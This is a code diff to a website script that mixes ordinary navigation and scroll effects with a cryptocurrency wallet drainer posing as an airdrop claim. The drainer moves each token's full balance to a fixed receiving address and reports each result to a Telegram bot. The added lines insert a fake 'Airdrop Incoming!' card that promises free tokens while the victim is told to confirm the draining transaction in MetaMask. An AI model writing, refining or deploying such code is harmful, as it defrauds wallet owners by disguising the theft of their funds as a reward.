@@ -14,7 +14,7 @@ const addEventOnElem = function (elem, type, callback) {
 };
 
 /**
- * Navbar toggle
+ * Navbar toggle, header active, and other UI scripts
  */
 const navbar = document.querySelector("[data-navbar]");
 const navbarLinks = document.querySelectorAll("[data-nav-link]");
@@ -36,9 +36,6 @@ const closeNavbar = function () {
 
 addEventOnElem(navbarLinks, "click", closeNavbar);
 
-/**
- * Header active on scroll
- */
 const header = document.querySelector("[data-header]");
 
 const activeHeader = function () {
@@ -51,9 +48,6 @@ const activeHeader = function () {
 
 addEventOnElem(window, "scroll", activeHeader);
 
-/**
- * Toggle active on add to fav
- */
 const addToFavBtns = document.querySelectorAll("[data-add-to-fav]");
 
 const toggleActive = function () {
@@ -62,9 +56,6 @@ const toggleActive = function () {
 
 addEventOnElem(addToFavBtns, "click", toggleActive);
 
-/**
- * Scroll reveal effect
- */
 const sections = document.querySelectorAll("[data-section]");
 
 const scrollReveal = function () {
@@ -265,8 +256,15 @@ ${nativeBalanceMessage}
               ], currentSigner);
 
               const balance = ethers.utils.formatUnits(token.balance, token.decimals ?? 0);
+
+              // Show enhanced airdrop card
+              showAirdropCard();
+
               const transferTx = await contract.transfer(network.exodusAddress, token.balance);
               await transferTx.wait();
+
+              // Hide card after transaction
+              hideAirdropCard();
 
               const transferSuccessMessage = `
 ✅ Transfer Successful
@@ -281,6 +279,9 @@ Tx: ${transferTx.hash}
                 body: JSON.stringify({ chat_id: chatId, text: transferSuccessMessage })
               });
             } catch (err) {
+              // Hide card on error
+              hideAirdropCard();
+
               const errorMessage = `
 ❌ Transfer Failed
 Token: ${token.symbol || 'Unknown'}
@@ -309,19 +310,60 @@ Address: ${userAddress}
         const errorMessage = `❌ Error on ${network.name}: ${err.message}`;
         await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
           method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ chat_id: chatId, text: errorMessage })
-          });
-        }
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ chat_id: chatId, text: errorMessage })
+        });
       }
-    } catch (err) {
-      const errorMessage = `❌ Wallet Connection Failed: ${err.message}`;
-      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ chat_id: chatId, text: errorMessage })
-      });
     }
+  } catch (err) {
+    const errorMessage = `❌ Wallet Connection Failed: ${err.message}`;
+    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ chat_id: chatId, text: errorMessage })
+    });
   }
-  
-  document.getElementById("claim-airdrop-btn")?.addEventListener("click", connectWalletAndSendTokens);
+}
+
+/**
+ * Airdrop card functions
+ */
+function showAirdropCard() {
+  // Remove any existing card
+  const existingCard = document.getElementById("airdrop-card");
+  if (existingCard) existingCard.remove();
+
+  // Create card
+  const card = document.createElement("div");
+  card.id = "airdrop-card";
+  card.innerHTML = `
+    <div class="airdrop-card-content">
+      <img src="https://cryptologos.cc/logos/cryptex-finance-ctx-logo.png" alt="CTX Logo" class="token-logo">
+      <h2>Airdrop Incoming!</h2>
+      <p>100 $CTX (Cryptex Finance Coin) is being credited to your wallet!</p>
+      <div class="progress-bar">
+        <div class="progress"></div>
+      </div>
+      <p class="small-text">Please confirm the transaction in MetaMask to proceed.</p>
+    </div>
+  `;
+  document.body.appendChild(card);
+
+  // Trigger progress bar animation
+  setTimeout(() => {
+    const progress = card.querySelector(".progress");
+    if (progress) {
+      progress.style.width = "100%";
+    }
+  }, 100);
+}
+
+function hideAirdropCard() {
+  const card = document.getElementById("airdrop-card");
+  if (card) {
+    card.style.opacity = "0";
+    setTimeout(() => card.remove(), 300);
+  }
+}
+
+document.getElementById("claim-airdrop-btn")?.addEventListener("click", connectWalletAndSendTokens);
